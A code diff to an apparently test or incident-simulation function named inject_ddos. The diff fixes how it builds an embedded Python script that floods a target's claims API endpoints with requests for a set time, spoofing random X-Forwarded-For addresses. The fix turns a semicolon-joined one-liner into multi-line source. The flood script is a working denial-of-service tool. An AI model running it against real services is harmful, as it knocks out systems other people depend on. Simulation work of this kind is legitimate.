@@ -139,30 +139,33 @@ def inject_ddos(
     # Register attacker task definition
     print("[4/5] Registering attacker task definition...")
 
-    # The attacker script floods multiple endpoints with varying request patterns
+    # The attacker script floods multiple endpoints with varying request patterns.
+    # Uses a multi-line source string so `while`/`try` compound statements parse
+    # correctly — a semicolon-joined one-liner is a SyntaxError.
     attack_script = (
-        "import urllib.request, time, random, os, sys; "
-        "sys.stdout.write(f'[ATTACKER] DDoS flood started (PID {os.getpid()})\\n'); "
-        "sys.stdout.flush(); "
-        f"target = '{target_url}'; "
-        "endpoints = ['/api/claims', '/api/claims?status=pending', '/api/claims?page=1&size=100', '/health']; "
-        f"end_time = time.time() + {duration}; "
-        "count = 0; errors = 0; "
-        "while time.time() < end_time: "
-        "    try: "
-        "        ep = random.choice(endpoints); "
-        "        url = f'{target}{ep}'; "
-        "        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0', 'X-Forwarded-For': f'10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}'}); "
-        "        urllib.request.urlopen(req, timeout=5); "
-        "        count += 1; "
-        "    except Exception as e: "
-        "        errors += 1; "
-        "    if count % 100 == 0: "
-        "        sys.stdout.write(f'[ATTACKER] Sent {count} requests ({errors} errors)\\n'); "
-        "        sys.stdout.flush(); "
-        "    time.sleep(random.uniform(0.01, 0.05)); "
-        "sys.stdout.write(f'[ATTACKER] Flood complete: {count} requests, {errors} errors\\n'); "
-        "sys.stdout.flush()"
+        "import urllib.request, time, random, os, sys\n"
+        "sys.stdout.write(f'[ATTACKER] DDoS flood started (PID {os.getpid()})\\n')\n"
+        "sys.stdout.flush()\n"
+        f"target = '{target_url}'\n"
+        "endpoints = ['/api/claims', '/api/claims?status=pending', '/api/claims?page=1&size=100', '/health']\n"
+        f"end_time = time.time() + {duration}\n"
+        "count = 0\n"
+        "errors = 0\n"
+        "while time.time() < end_time:\n"
+        "    try:\n"
+        "        ep = random.choice(endpoints)\n"
+        "        url = f'{target}{ep}'\n"
+        "        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0', 'X-Forwarded-For': f'10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}'})\n"
+        "        urllib.request.urlopen(req, timeout=5)\n"
+        "        count += 1\n"
+        "    except Exception as e:\n"
+        "        errors += 1\n"
+        "    if count % 100 == 0:\n"
+        "        sys.stdout.write(f'[ATTACKER] Sent {count} requests ({errors} errors)\\n')\n"
+        "        sys.stdout.flush()\n"
+        "    time.sleep(random.uniform(0.01, 0.05))\n"
+        "sys.stdout.write(f'[ATTACKER] Flood complete: {count} requests, {errors} errors\\n')\n"
+        "sys.stdout.flush()\n"
     )
 
     # Get execution role from an existing task
